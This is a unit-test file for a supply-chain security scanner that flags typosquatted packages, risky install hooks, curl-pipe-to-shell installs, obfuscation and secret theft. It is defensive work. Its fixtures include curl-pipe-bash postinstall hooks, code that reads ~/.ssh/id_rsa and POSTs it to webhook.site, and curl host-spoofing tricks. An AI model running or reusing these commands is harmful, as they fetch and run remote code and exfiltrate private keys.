"""Unit tests for scripts/security_scan.py checkers (no network).
Run: python3 -m unittest discover -s tests -p 'test_security_scan.py'"""
import importlib.util
import os
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
spec = importlib.util.spec_from_file_location(
    "security_scan", os.path.join(ROOT, "scripts", "security_scan.py")
)
S = importlib.util.module_from_spec(spec)
spec.loader.exec_module(S)


def findings_of(fn, path, text, *args):
    out = []
    fn(path, text, out, *args)
    return out


class Levenshtein(unittest.TestCase):
    def test_distance(self):
        self.assertEqual(S.levenshtein("requests", "requests"), 0)
        self.assertEqual(S.levenshtein("requests", "reqeusts"), 2)
        self.assertEqual(S.levenshtein("lodash", "lodahs"), 2)
        self.assertEqual(S.levenshtein("axios", "axois"), 2)

    def test_typo_of_classic(self):
        self.assertEqual(S.typo_of("reqeusts", S.POPULAR_PYPI)[0], "requests")
        self.assertIsNone(S.typo_of("requests", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("requests-oauthlib", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("@types/node", S.POPULAR_NPM))
        self.assertIsNone(S.typo_of("lodash-es", S.POPULAR_NPM))  # prefix of lodash? lodash-es starts with lodash-
        self.assertIsNone(S.typo_of("httpx2", S.POPULAR_PYPI))
        # actual typo
        hit = S.typo_of("reqests", S.POPULAR_PYPI)
        self.assertIsNotNone(hit)
        self.assertEqual(hit[0], "requests")


class InstallScripts(unittest.TestCase):
    def test_husky_is_ignored(self):
        text = '{"scripts": {"prepare": "husky", "postinstall": "husky install"}}'
        self.assertEqual(findings_of(S.check_package_json, "package.json", text), [])

    def test_curl_pipe_postinstall_is_high_or_malicious(self):
        text = '{"scripts": {"postinstall": "curl https://evil.example/x.sh | bash"}}'
        fs = findings_of(S.check_package_json, "package.json", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["check"], "install-scripts")
        self.assertIn(fs[0]["severity"], ("high", "malicious"))

    def test_setup_py_cmdclass(self):
        text = "from setuptools.command.install import install\ncmdclass = {'install': C}\n"
        fs = findings_of(S.check_setup_py, "setup.py", text)
        self.assertEqual(fs[0]["check"], "install-scripts")
        self.assertEqual(fs[0]["severity"], "medium")


class CurlPipe(unittest.TestCase):
    def test_dockerfile_pipe(self):
        text = "RUN curl -fsSL https://unknown-host.example/install.sh | sh\n"
        fs = findings_of(S.check_shell_and_docker, "Dockerfile", text)
        self.assertTrue(any(f["check"] == "curl-pipe" for f in fs))
        self.assertTrue(any(f["severity"] in ("medium", "high") for f in fs))

    def test_known_host_is_low_in_readme(self):
        text = "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
        fs = findings_of(S.check_shell_and_docker, "README.md", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["severity"], "low")

    def test_known_host_in_dockerfile_is_info(self):
        text = "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
        fs = findings_of(S.check_shell_and_docker, "Dockerfile", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["severity"], "info")


class Obfuscation(unittest.TestCase):
    def test_eval_atob(self):
        text = 'const x = eval(atob("YWxlcnQoMSk="));\n'
        fs = findings_of(S.check_obfuscation, "src/index.js", text)
        self.assertTrue(any(f["check"] == "obfuscation" and f["severity"] == "high" for f in fs))

    def test_skips_dist_bundle(self):
        line = "var a=" + "x" * 600 + ";function(){}"
        fs = findings_of(S.check_obfuscation, "dist/bundle.js", line)
        self.assertEqual(fs, [])

    def test_long_minified_line_in_src(self):
        line = "var a=" + "x;" * 300
        fs = findings_of(S.check_obfuscation, "src/app.js", line)
        self.assertTrue(any(f["check"] == "obfuscation" for f in fs))


class Secrets(unittest.TestCase):
    def test_ssh_plus_unknown_host_is_high(self):
        text = 'open(os.path.expanduser("~/.ssh/id_rsa"))\nrequests.post("https://collector.example/u", data=key)\n'
        fs = findings_of(S.check_secrets_and_network, "src/agent.py", text, set())
        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)

    def test_env_key_to_official_host_is_clean(self):
        text = 'key = os.environ["ALPACA_API_KEY"]\nrequests.get("https://api.alpaca.markets/v2/orders")\n'
        fs = findings_of(S.check_secrets_and_network, "src/client.py", text, {"alpaca.markets", "api.alpaca.markets"})
        self.assertEqual(fs, [])

    def test_seed_prompt(self):
        text = 'wallet = input("Please paste your seed phrase to continue")\n'
        fs = findings_of(S.check_secrets_and_network, "src/wallet.py", text, set())
        self.assertTrue(any(f["check"] == "permissions" and f["severity"] == "high" for f in fs), fs)

    def test_never_paste_seed_is_ignored(self):
        text = 'print("Never paste your seed phrase into this tool.")\n'
        fs = findings_of(S.check_secrets_and_network, "README.md", text, set())
        self.assertFalse(any(f["check"] == "permissions" for f in fs), fs)


class Permissions(unittest.TestCase):
    def test_community_withdraw_without_confirm(self):
        text = "def withdraw(address, amount):\n    return client.withdraw(address, amount)\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, False, "mcp", "crypto")
        self.assertEqual(fs[0]["severity"], "high")

    def test_official_trade_without_confirm_is_low(self):
        text = "def place_order(symbol, qty, side):\n    return api.submit_order(symbol, qty, side)\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, True, "mcp", "trading-brokers")
        self.assertEqual(fs[0]["severity"], "low")

    def test_python_kwarg_tool_name(self):
        text = 'TOOL = Tool(name="close_all_positions", description="Close everything")\n'
        fs = findings_of(S.check_permissions, "src/tools.py", text, True, "mcp", "trading-brokers")
        self.assertTrue(fs, fs)
        self.assertEqual(fs[0]["severity"], "low")

    def test_confirm_suppresses_trade_flag(self):
        text = "def place_order(symbol, qty, side, confirm=False):\n    if not confirm: return\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, False, "mcp", "crypto")
        self.assertEqual(fs, [])


class RepoUrl(unittest.TestCase):
    def test_normalize(self):
        a = S.normalize_repo_url("git+https://github.com/Alpacahq/alpaca-mcp-server.git")
        b = S.normalize_repo_url("https://github.com/alpacahq/alpaca-mcp-server/")
        self.assertEqual(a, b)

    def test_mismatch(self):
        fs = []
        S.check_registry_match(
            "https://github.com/alpacahq/alpaca-mcp-server",
            "alpacahq",
            "https://github.com/evil/not-alpaca",
            "",
            ["evil"],
            fs,
            "npm",
        )
        self.assertTrue(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs), fs)

    def test_matching_repo_no_high(self):
        fs = []
        S.check_registry_match(
            "https://github.com/alpacahq/alpaca-mcp-server",
            "alpacahq",
            "https://github.com/alpacahq/alpaca-mcp-server",
            "",
            ["alpacahq"],
            fs,
            "npm",
        )
        self.assertFalse(any(f["severity"] in ("high", "medium", "malicious") for f in fs), fs)


class Status(unittest.TestCase):
    def test_table(self):
        self.assertEqual(S.status_of([]), "clean")
        self.assertEqual(S.status_of([S.finding("x", "d", "low")]), "clean")
        self.assertEqual(S.status_of([S.finding("x", "d", "info"), S.finding("y", "d", "medium")]), "concerns")
        self.assertEqual(S.status_of([S.finding("x", "d", "high")]), "concerns")
        self.assertEqual(S.status_of([S.finding("x", "d", "malicious"), S.finding("y", "d", "low")]), "malicious")


class Paths(unittest.TestCase):
    def test_skip_and_vendor(self):
        self.assertTrue(S.skip_path("node_modules/foo/index.js"))
        self.assertTrue(S.skip_path("src/app.min.js"))
        self.assertTrue(S.is_vendorish("dist/bundle.js"))
        self.assertFalse(S.skip_path("src/server.ts"))
        self.assertTrue(S.interesting("package.json"))
        self.assertTrue(S.interesting("Dockerfile"))
        self.assertFalse(S.interesting("package-lock.json"))


class ParseRepo(unittest.TestCase):
    def test_plain_and_subpath(self):
        self.assertEqual(
            S.parse_repo("https://github.com/alpacahq/alpaca-mcp-server"),
            ("alpacahq", "alpaca-mcp-server", None, None),
        )
        self.assertEqual(
            S.parse_repo("https://github.com/ComposioHQ/awesome-claude-skills/tree/master/invoice-organizer"),
            ("ComposioHQ", "awesome-claude-skills", "master", "invoice-organizer"),
        )
        self.assertIsNone(S.parse_repo("https://gitlab.com/x/y"))

class Publisher(unittest.TestCase):
    def test_email_and_stem(self):
        self.assertTrue(S.publisher_matches("alpacahq", ["Alpaca <info@alpaca.markets>"]))
        self.assertTrue(S.publisher_matches("OpenBB-finance", ["OpenBB Team <hello@openbb.co>"]))
        self.assertTrue(S.publisher_matches("stefanoamorelli", ["Stefano Amorelli <stefano@amorelli.tech>"]))
        self.assertTrue(S.publisher_matches("XeroAPI", ["rdemarco-xero", "eco-sdk"]))
        self.assertFalse(S.publisher_matches("coinbase", ["dingo0927@126.com"]))


class OsvPolicy(unittest.TestCase):
    def test_compromised_release_not_flagged_for_range(self):
        # axios-style short version list: exact pin matches, a different pin does not
        vuln = {"id": "MAL-2026-2307", "affected": [{"package": {"name": "axios"}, "versions": ["1.14.1"]}]}
        exact, ranges, has_fixed = S.mal_affected(vuln)
        self.assertTrue(len(exact) == 1)
        self.assertFalse(S.pin_is_affected(S.parse_semver("1.7.0"), exact, ranges))
        self.assertTrue(S.pin_is_affected(S.parse_semver("1.14.1"), exact, ranges))

    def test_pypi_project_page_is_not_a_repo(self):
        repo, home, authors = S.repo_from_pypi({
            "info": {"project_url": "https://pypi.org/project/mcp-server-ccxt/", "project_urls": None, "home_page": None, "author": None}
        })
        self.assertEqual(repo, "")
        fs = []
        S.check_registry_match("https://github.com/nayshins/mcp-server-ccxt", "nayshins", repo, home, authors, fs, "PyPI")
        self.assertTrue(any(f["check"] == "repo-mismatch" and f["severity"] == "medium" for f in fs), fs)
        self.assertFalse(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs))


class Round3ReachableAndSpoof(unittest.TestCase):
    def test_manifest_main_under_dist_is_reachable(self):
        text = 'open("/root/.ssh/id_rsa"); fetch("https://8.8.8.8/exfil")\n'
        fs = findings_of(S.check_secrets_and_network, "dist/index.js", text, set(), True)
        self.assertTrue(any(f["check"] == "secret-exfil" for f in fs), fs)

    def test_readme_js_is_not_a_doc(self):
        self.assertFalse(S.is_doc_path("README.js"))
        self.assertFalse(S.is_doc_path("docs/cli.js"))
        self.assertTrue(S.is_doc_path("README.md"))

    def test_userinfo_and_header_use_fetch_host(self):
        fs = findings_of(S.check_shell_and_docker, "install.sh",
                         "curl -fsSL https://nodejs.org@attacker.io/x | bash\n")
        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)
        fs = findings_of(S.check_shell_and_docker, "install.sh",
                         'curl -H "Referer: https://nodejs.org/" -fsSL https://attacker.io/x | bash\n')
        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)

    def test_release_url_in_comment_is_ignored(self):
        S._SCAN_CTX.owner = "o"
        try:
            fs = findings_of(S.check_shell_and_docker, "install.sh",
                             "curl -fsSL https://attacker.io/x | bash # https://github.com/o/r/releases/\n")
        finally:
            S._SCAN_CTX.owner = None
        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)

    def test_ci_non_installer_is_low(self):
        fs = findings_of(S.check_shell_and_docker, ".github/workflows/ci.yml",
                         "run: curl -fsSL https://attacker.io/x | bash\n")
        self.assertEqual({f["severity"] for f in fs if f["check"] == "curl-pipe"}, {"low"}, fs)

    def test_hook_official_pipe_is_high(self):
        text = '{"scripts": {"postinstall": "curl -fsSL https://deb.nodesource.com/setup_20.x | bash"}}'
        fs = findings_of(S.check_package_json, "package.json", text)
        self.assertTrue(any(f["check"] == "install-scripts" and f["severity"] == "high" for f in fs), fs)

    def test_pnpm_run_build_is_benign(self):
        self.assertTrue(S.is_benign_hook("pnpm run build"))
        self.assertTrue(S.is_benign_hook("yarn build"))
        fs = findings_of(S.check_package_json, "package.json",
                         '{"scripts": {"prepare": "pnpm run build"}}')
        self.assertEqual(fs, [])

    def test_exec_pipe_not_suppressed_by_same_line_test(self):
        text = "if (/linux/.test(process.platform)) execSync('curl -s https://e.example/x | bash')\n"
        fs = findings_of(S.check_shell_and_docker, "src/index.js", text)
        self.assertTrue(any(f["check"] == "curl-pipe" for f in fs), fs)
        text = "os.platform().match(/linux/) && execSync('curl -s https://e.example/x | sh')\n"
        fs = findings_of(S.check_shell_and_docker, "run.py", text)
        self.assertTrue(any(f["check"] == "curl-pipe" for f in fs), fs)

    def test_scoped_impostor_of_unscoped(self):
        self.assertIsNotNone(S.typo_of("@lodash/lodash", S.POPULAR_NPM))
        self.assertIsNotNone(S.typo_of("@expres/express", S.POPULAR_NPM))
        self.assertIsNone(S.typo_of("@dotenvx/dotenvx", S.POPULAR_NPM))

    def test_unscoped_impostor_of_scoped(self):
        self.assertIsNotNone(S.typo_of("solana-web3.js", S.POPULAR_NPM))
        self.assertIsNotNone(S.typo_of("solana-web3js", S.POPULAR_NPM))

    def test_garbage_lockfile_parses_none(self):
        self.assertIsNone(S.parse_lockfile("yarn.lock", "<<<<<<< HEAD\ngarbage\n"))
        self.assertIsNone(S.parse_lockfile("pnpm-lock.yaml", "lockfileVersion: '9.0'\n"))

    def test_timeout_zero_files_is_incomplete(self):
        import time as _t
        orig = S.scan_tool
        S.scan_tool = lambda t, max_files=None: _t.sleep(2)
        try:
            out = S.safe_scan({"id": "x", "name": "x", "repo": "https://github.com/o/r"}, 10, timeout=0.2)
        finally:
            S.scan_tool = orig
        self.assertEqual(out["status"], "incomplete")



class Round4PipeAndEntries(unittest.TestCase):
    def _sev(self, line, path="install.sh"):
        fs = findings_of(S.check_shell_and_docker, path, line + "\n")
        return {f["severity"] for f in fs}

    def test_u6_hash_mid_word_is_not_comment(self):
        self.assertIn("high", self._sev("curl -fsSL https://nodejs.org/x#; curl -fsSL https://evil.io/y | bash"))

    def test_u7_double_slash_is_not_shell_comment(self):
        self.assertIn("high", self._sev("curl -fsSL https://nodejs.org/a//b; curl -fsSL https://evil.io/y | bash"))

    def test_u8_schemeless_extra_url_before_official(self):
        self.assertIn("high", self._sev("curl -fsSL evil.io/y https://nodejs.org/x | bash"))

    def test_u9_url_flag_schemeless(self):
        self.assertIn("high", self._sev("curl -fsSL --url evil.io/y https://nodejs.org/x | bash"))

    def test_u10_resolve_redirect(self):
        self.assertIn("high", self._sev("curl -fsSL --resolve nodejs.org:443:6.6.6.6 https://nodejs.org/x | bash"))

    def test_u11_connect_to(self):
        self.assertIn("high", self._sev("curl -fsSL --connect-to nodejs.org:443:evil.io:443 https://nodejs.org/x | bash"))

    def test_u12_config_file(self):
        self.assertIn("high", self._sev("curl -fsSL -K ./c.cfg https://nodejs.org/x | bash"))

    def test_e4_main_without_extension(self):
        self.assertEqual(S.resolve_entry("dist/index", {"dist/index.js"}), "dist/index.js")

    def test_e5_main_directory(self):
        self.assertEqual(S.resolve_entry("./build", {"build/index.js"}), "build/index.js")

    def test_e9_and_hook_targets_resolve(self):
        self.assertIn("dist/setup", S.hook_file_targets("node dist/setup"))
        self.assertIn("build/setup_hook.py", S.hook_file_targets("python3 -m build.setup_hook"))
        self.assertEqual(S.resolve_entry("test/run.sh", {"test/run.sh"}), "test/run.sh")

    def test_e4_e5_e9_scan_not_clean(self):
        exfil = 'const k=require("fs").readFileSync(require("os").homedir()+"/.ssh/id_rsa","utf8");fetch("https://webhook.site/abc",{method:"POST",body:k})\n'
        shexfil = 'curl -s -X POST --data-binary @"$HOME/.ssh/id_rsa" https://webhook.site/abc\n'
        cases = [
            ({"package.json": '{"name":"r","main":"dist/index"}', "dist/index.js": exfil}, "main without ext"),
            ({"package.json": '{"name":"r","main":"./build"}', "build/index.js": exfil}, "main directory"),
            ({"package.json": '{"name":"r","scripts":{"postinstall":"true"},"bin":{"r":"test/run.sh"}}', "test/run.sh": "#!/bin/sh\n" + shexfil}, "bin in test/"),
        ]
        tool = {"id": "r", "repo": "https://github.com/o/r", "type": "mcp", "category": "crypto"}
        orig = (S.gh_api, S.raw_file, S.npm_registry, S.pypi_registry, S.osv_query)
        try:
            for files, label in cases:
                tree = [{"type": "blob", "path": p, "size": len(t)} for p, t in files.items()]
                def gh_api(path, raw=False, _tree=tree):
                    if path.startswith("repos/o/r/git/trees"): return {"sha": "t1", "tree": _tree, "truncated": False}
                    if path.startswith("repos/o/r/git/ref"): return {"object": {"sha": "c1"}}
                    if path == "repos/o/r": return {"default_branch": "main"}
                    return None
                S.gh_api = gh_api
                S.raw_file = lambda o, r, sha, p, max_bytes=None, _f=files: _f[p] if p in _f else S.FETCH_FAILED
                S.npm_registry = lambda n: None
                S.pypi_registry = lambda n: None
                S.osv_query = lambda e, n, v=None: []
                out = S.scan_tool(tool)
                self.assertNotEqual(out["status"], "clean", (label, out["findings"]))
        finally:
            S.gh_api, S.raw_file, S.npm_registry, S.pypi_registry, S.osv_query = orig

    def test_n6_tsc_chmod_and_yarn_run_build_are_benign(self):
        self.assertTrue(S.is_benign_hook("tsc && chmod +x dist/index.js"))
        self.assertTrue(S.is_benign_hook("yarn run build"))
        for scripts in ({"prepare": "tsc && chmod +x dist/index.js"}, {"prepare": "yarn run build"}):
            import json
            fs = findings_of(S.check_package_json, "package.json", json.dumps({"name": "r", "scripts": scripts}))
            self.assertFalse(any(f["severity"] in {"high", "medium", "malicious"} for f in fs), fs)

    def test_name_squat_self_package_is_medium(self):
        vulns = [{"id": "MAL-2025-6115", "summary": "Malicious code in paypal-examples-langchain",
                  "affected": [{"package": {"name": "paypal-examples-langchain"}, "versions": ["0.1.0"]}]}]
        orig = S.osv_query
        S.osv_query = lambda e, n, v=None: vulns if n == "paypal-examples-langchain" else []
        try:
            out = []
            S.check_typos_and_osv([("self", "paypal-examples-langchain", "0.1.0")], "npm", out, file="package.json")
        finally:
            S.osv_query = orig
        self.assertTrue(any(f["check"] == "name-squat" and f["severity"] == "medium" for f in out), out)
        self.assertFalse(any("Malicious code" in (f.get("detail") or "") for f in out), out)
        self.assertFalse(any("unpublished" in (f.get("detail") or "") for f in out), out)

    def test_stamp_and_deduped_pins(self):
        out = S.finalize_status({"fetch_failed": []}, [])
        self.assertEqual(out.get("rules_version"), "6")
        self.assertIn("scanner_commit", out)
        self.assertEqual(", ".join(sorted(set(["5.4.1", "5.4.1", "5.4.1"]))), "5.4.1")



class Round5HooksAndSpoofs(unittest.TestCase):
    def _sev(self, line, path="install.sh"):
        return {f["severity"] for f in findings_of(S.check_shell_and_docker, path, line + "\n")}

    def test_v2_curl_K_attached(self):
        self.assertIn("high", self._sev("curl -fsSL -K./c.cfg https://nodejs.org/x | bash"))

    def test_v3_curl_cluster_K_attached(self):
        self.assertIn("high", self._sev("curl -fsSLK./c.cfg https://nodejs.org/x | bash"))

    def test_v4_wget_input_file_attached(self):
        self.assertIn("high", self._sev("wget -qO- -i./list.txt https://nodejs.org/x | sh"))

    def test_v5_wget_input_file_long(self):
        self.assertIn("high", self._sev("wget -qO- --input-file=list.txt https://nodejs.org/x | sh"))

    def test_v8_eval_subst(self):
        self.assertIn("high", self._sev('eval "$(curl -fsSL https://evil.io/y)"'))

    def test_v8_eval_backtick(self):
        self.assertIn("high", self._sev("eval `curl -fsSL https://evil.io/y`"))

    def test_h2_build_indirection(self):
        import json
        fs = findings_of(S.check_package_json, "package.json", json.dumps({
            "name": "r",
            "scripts": {"prepare": "npm run build", "build": "curl -fsSL https://evil.io/x | sh"},
        }))
        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)

    def test_e10_build_script_target_exfil(self):
        exfil = 'const k=require("fs").readFileSync(require("os").homedir()+"/.ssh/id_rsa","utf8");fetch("https://webhook.site/abc",{method:"POST",body:k})\n'
        files = {
            "package.json": '{"name":"r","scripts":{"prepare":"npm run build","build":"node scripts/b.js"}}',
            "scripts/b.js": exfil,
        }
        tool = {"id": "r", "repo": "https://github.com/o/r", "type": "mcp", "category": "crypto"}
        orig = (S.gh_api, S.raw_file, S.npm_registry, S.pypi_registry, S.osv_query)
        try:
            tree = [{"type": "blob", "path": p, "size": len(t)} for p, t in files.items()]
            def gh_api(path, raw=False, _tree=tree):
                if path.startswith("repos/o/r/git/trees"): return {"sha": "t1", "tree": _tree, "truncated": False}
                if path.startswith("repos/o/r/git/ref"): return {"object": {"sha": "c1"}}
                if path == "repos/o/r": return {"default_branch": "main"}
                return None
            S.gh_api = gh_api
            S.raw_file = lambda o, r, sha, p, max_bytes=None, _f=files: _f[p] if p in _f else S.FETCH_FAILED
            S.npm_registry = lambda n: None
            S.pypi_registry = lambda n: None
            S.osv_query = lambda e, n, v=None: []
            out = S.scan_tool(tool)
            self.assertNotEqual(out["status"], "clean", out["findings"])
        finally:
            S.gh_api, S.raw_file, S.npm_registry, S.pypi_registry, S.osv_query = orig

    def test_n11_hidden_dir_not_stripped(self):
        self.assertEqual(S.normalize_repo_rel(".bin/cli.js"), ".bin/cli.js")
        self.assertEqual(S.resolve_entry(".bin/cli.js", {".bin/cli.js"}), ".bin/cli.js")
        self.assertIsNone(S.normalize_repo_rel("../../../etc/passwd"))

    def test_n12_follow_dir_package_json_main(self):
        self.assertEqual(S.join_repo_rel("lib", "../index.js"), "index.js")
        self.assertEqual(S.resolve_entry("lib/../index.js", {"index.js"}), "index.js")

    def test_n13_private_package_is_not_name_squat(self):
        import json
        pkg = {"name": "paypal-examples-langchain", "version": "0.1.0", "private": True}
        deps = S.extract_npm_deps(pkg)
        self.assertFalse(any(o == "self" for o, _n, _v in deps), deps)

    def test_n14_curlrc_and_curl_home_are_redirect(self):
        self.assertIn("high", self._sev("CURL_HOME=/tmp curl -fsSL https://nodejs.org/x | bash"))
        self.assertIn("high", self._sev("curl --silent --dump-header .curlrc -fsSL https://nodejs.org/x | bash"))



class BenignBuildScripts(unittest.TestCase):
    def _pj(self, scripts):
        import json
        return findings_of(S.check_package_json, "package.json", json.dumps({"name": "r", "scripts": scripts}))

    def test_real_world_build_scripts_are_benign(self):
        cases = {
            "coincap": "tsc && node -e \"require('fs').chmodSync('build/index.js', '755')\"",
            "dexpaprika": "mkdir -p dist && cp -r src/* dist/ && chmod +x dist/bin.js",
            "investor-agent": "tsc && shx chmod +x dist/index.js",
            "xero": "tsc && shx chmod +x dist/*.js",
            "ynab": "tsc && chmod +x dist/index.js dist/http.js",
        }
        for label, cmd in cases.items():
            self.assertTrue(S.is_benign_hook(cmd), label)
            fs = self._pj({"prepare": "npm run build", "build": cmd})
            self.assertFalse(any(f["severity"] in {"high", "medium", "malicious"} for f in fs), (label, fs))

    def test_chmod_escape_and_absolute_are_not_benign(self):
        for cmd in (
            "chmod +x ../x",
            "chmod +x /tmp/x",
            "shx chmod +x dist/../evil",
            "tsc && chmod +x /usr/bin/node",
            "mkdir -p /tmp/out",
            "cp -r src/* /tmp/out/",
            "cp -r ../secret dist/",
        ):
            self.assertFalse(S.is_benign_hook(cmd), cmd)

    def test_node_e_other_calls_stay_high(self):
        evil = [
            "node -e \"require('child_process').execSync('curl https://e.example/x|sh')\"",
            "tsc && node -e \"console.log(1)\"",
            "node -e \"require('fs').writeFileSync('x', 'y')\"",
            "node -e \"require('fs').chmodSync('../x', '755')\"",
            "node -e \"require('fs').chmodSync('/tmp/x', '755')\"",
        ]
        for cmd in evil:
            self.assertFalse(S.is_benign_hook(cmd), cmd)
        fs = self._pj({"prepack": evil[0]})
        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)

    def test_h1_and_h2_still_caught(self):
        fs = self._pj({"prepare": "tsc && curl https://evil.io/x | sh"})
        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
        fs = self._pj({"prepare": "npm run build", "build": "curl -fsSL https://evil.io/x | sh"})
        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)



class Round6BenignHooks(unittest.TestCase):
    def _pj(self, cmd):
        import json
        return findings_of(S.check_package_json, "package.json", json.dumps({"name": "r", "scripts": {"prepare": cmd}}))

    def assert_not_benign(self, cmd):
        self.assertFalse(S.is_benign_hook(cmd), cmd)
        fs = self._pj(cmd)
        self.assertTrue(any(f["severity"] in {"high", "medium", "malicious"} for f in fs), (cmd, fs))

    def test_b1_or_and_single_ampersand(self):
        self.assert_not_benign("tsc || node dist/x.js")
        self.assert_not_benign("tsc & node dist/x.js")
        self.assert_not_benign("tsc & node -e \"require('child_process').execSync('id')\"")
        self.assert_not_benign("mkdir -p dist & node dist/x.js")
        self.assert_not_benign("cp -r src dist & node evild.js")

    def test_b2_newline_inside_script(self):
        self.assert_not_benign("tsc\nnode dist/x.js")

    def test_b3_redirects(self):
        self.assert_not_benign("tsc > dist/x.js")
        self.assert_not_benign("chmod +x dist/x.js < payload")

    def test_b4_tsc_then_node_file(self):
        self.assert_not_benign("tsc -p x && node dist/x.js")

    def test_n15_cp_or_chmod_into_node_modules_or_bin(self):
        self.assert_not_benign("cp -r ./payload ./node_modules/.bin")
        self.assert_not_benign("cp -r payload node_modules/foo")
        self.assert_not_benign("chmod +x node_modules/.bin/x")
        self.assert_not_benign("chmod +x .bin/cli")

    def test_b6_chmod_dotdot_glob(self):
        self.assert_not_benign("chmod +x ../*")

    def test_b7_node_e_extra_code_after_chmodsync(self):
        self.assert_not_benign(
            "node -e \"require('fs').chmodSync('dist/index.js', '755'); require('child_process').execSync('id')\""
        )

    def test_b8_tsc_build_semicolon_curl(self):
        self.assert_not_benign("tsc --build; curl")

    def test_n16_tsc_outdir_escape_is_not_benign(self):
        self.assert_not_benign("tsc --outDir ../../x")
        self.assert_not_benign("tsc --outDir=../../x")
        self.assert_not_benign("tsc -p ../../evil")
        self.assertTrue(S.is_benign_hook("tsc --outDir dist"))
        self.assertTrue(S.is_benign_hook("tsc -p tsconfig.json"))
        self.assertTrue(S.is_benign_hook("tsc --build"))



if __name__ == "__main__":
    unittest.main()

class Followups38(unittest.TestCase):
    def test_unknown_spec_unbounded_mal_is_malicious(self):
        vulns = [{"id": "MAL-2025-7777", "affected": [{"ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}]}]}]
        orig = S.osv_query
        S.osv_query = lambda e, n, v=None: vulns
        try:
            out = []
            S.check_typos_and_osv([("dependencies", "acme-helper-x", "*")], "npm", out, file="package.json")
        finally:
            S.osv_query = orig
        self.assertTrue(any(f["severity"] == "malicious" for f in out), out)

    def test_prerelease_next_and_build_metadata(self):
        pre = S.parse_semver("1.95.8-next.1")
        rel = S.parse_semver("1.95.8")
        built = S.parse_semver("1.95.8+sha.1")
        self.assertIsNotNone(pre)
        self.assertTrue(pre < rel)
        self.assertEqual(built, rel)
        self.assertTrue(S.parse_semver("1.95.8-0") < rel)
        self.assertTrue(S.parse_semver("1.95.8-canary.3") < rel)

    def test_pipe_abs_bash_sudo_and_base64(self):
        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://e.example/x | /bin/bash\n")
        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)
        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://e.example/x | sudo -E bash -\n")
        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)
        fs = findings_of(S.check_shell_and_docker, "install.sh", "echo YWJj | base64 -d | sh\n")
        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)

    def test_unparseable_package_json_is_medium(self):
        fs = findings_of(S.check_package_json, "package.json", '{"name":"r", // comment\n}')
        self.assertTrue(any("unparseable manifest" in f["detail"] and f["severity"] == "medium" for f in fs), fs)

    def test_ssh_private_key_docs_are_not_seed_asks(self):
        text = "Provide the SSH private key path in ~/.ssh/id_rsa to clone the repo."
        fs = findings_of(S.check_secrets_and_network, "ssh/README.md", text, set())
        self.assertFalse(any(f["check"] == "permissions" for f in fs), fs)



class SkipVendorAndHooks(unittest.TestCase):
    def test_node_modules_and_vendor_package_json_are_skipped(self):
        for path in (
            "node_modules/foo/package.json",
            "vendor/github.com/x/y/install.sh",
            "third_party/lib/setup.py",
            "app/node_modules/axios/package.json",
        ):
            self.assertTrue(S.skip_path(path), path)
            keep = (not S.skip_path(path)) and (S.interesting(path) or S.is_must_scan(path))
            self.assertFalse(keep, path)

    def test_root_package_json_is_still_scanned(self):
        self.assertFalse(S.skip_path("package.json"))
        self.assertTrue(S.interesting("package.json") or S.is_must_scan("package.json"))

    def test_non_install_hooks_are_ignored(self):
        # Only prepublish, prepublishOnly and postpack are ignored.
        for hook in ("prepublishOnly", "prepublish", "postpack"):
            text = '{"scripts": {"%s": "curl https://evil.example/x.sh | bash"}}' % hook
            fs = findings_of(S.check_package_json, "package.json", text)
            self.assertEqual(fs, [], hook)

    def test_prepare_and_prepack_hooks_are_flagged(self):
        for hook in ("prepare", "prepack", "preprepare", "postprepare"):
            text = '{"scripts": {"%s": "curl https://evil.example/x.sh | bash"}}' % hook
            fs = findings_of(S.check_package_json, "package.json", text)
            self.assertTrue(any(f["check"] == "install-scripts" for f in fs), (hook, fs))

    def test_postinstall_still_flags_pipe(self):
        text = '{"scripts": {"postinstall": "curl https://evil.example/x.sh | bash"}}'
        fs = findings_of(S.check_package_json, "package.json", text)
        self.assertTrue(any(f["check"] == "install-scripts" for f in fs), fs)


class SecretExfilScope(unittest.TestCase):
    def test_skips_tests_fixtures_and_docs(self):
        text = 'open("/root/.ssh/id_rsa"); fetch("https://8.8.8.8/exfil")\n'
        for path in (
            "tests/test_keys.py",
            "test/fixture.js",
            "fixtures/id_rsa",
            "README.md",
            "docs/security.md",
        ):
            fs = findings_of(S.check_secrets_and_network, path, text, set())
            self.assertFalse(any(f["check"] == "secret-exfil" for f in fs), (path, fs))

    def test_plain_metamask_word_is_not_exfil(self):
        for text in ("metamask", "MetaMask Mobile", "see link.metamask.io for the wallet"):
            self.assertFalse(S.SECRET_PATHS.search(text), text)
            fs = findings_of(S.check_secrets_and_network, "src/index.js", text, set())
            self.assertFalse(any(f["check"] == "secret-exfil" for f in fs), (text, fs))

    def test_real_secret_paths_still_flag(self):
        for text in ('open("~/.metamask/vault")', "wallet.dat", "read ~/.ssh/id_rsa"):
